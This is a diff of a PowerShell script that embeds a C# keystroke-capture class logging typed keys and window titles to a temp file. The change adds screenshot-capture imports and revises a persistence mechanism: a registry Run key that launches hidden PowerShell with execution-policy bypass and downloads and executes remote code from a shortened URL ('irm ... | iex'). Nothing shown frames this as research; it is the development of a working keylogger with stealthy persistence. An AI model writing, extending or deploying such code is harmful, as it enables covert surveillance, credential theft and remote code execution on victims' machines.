@@ -1,6 +1,3 @@
-# Ensure that the webhook URL is set directly from the command line
-$webhookURL = $dc  # $webhookURL is the variable passed via the command line
-
 # Define the path to the temp log file
 $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'temp_log.txt')
 
@@ -31,12 +28,13 @@ if (-not $customUtilityType) {
     # Add Type for custom utility class
     Add-Type @"
 using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
-using System.Diagnostics;
-using System.Collections.Generic;
+using System.Drawing;  // For screenshot
+using System.Drawing.Imaging;  // For saving screenshot in .png format
 
 public class KeyCaptureUtility
 {
@@ -200,13 +198,17 @@ public class KeyCaptureUtility
         return windowTitle.ToString();
     }
 }
+
 "@
 }
+
+# Convert the expiry date to 'yyyy-MM-dd' format
+$expiryDateFormatted = $expiryDate.ToString('yyyy-MM-dd')
 
 # Add the script to startup (by modifying the registry) with the provided URL
 $regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $scriptName = "Startup"
-$regCommand = "powershell -NoP -Ep Bypass -W H -C `$expiryDateParam='$expiryDate'; irm https://shorturl.at/FkQqM | iex"
+$regCommand = "powershell -NoP -Ep Bypass -W H -C `$expiryDate='$expiryDateFormatted'; irm https://shorturl.at/FkQqM | iex"
 
 # Add the entry to the registry for startup
 Set-ItemProperty -Path $regKeyPath -Name $scriptName -Value $regCommand
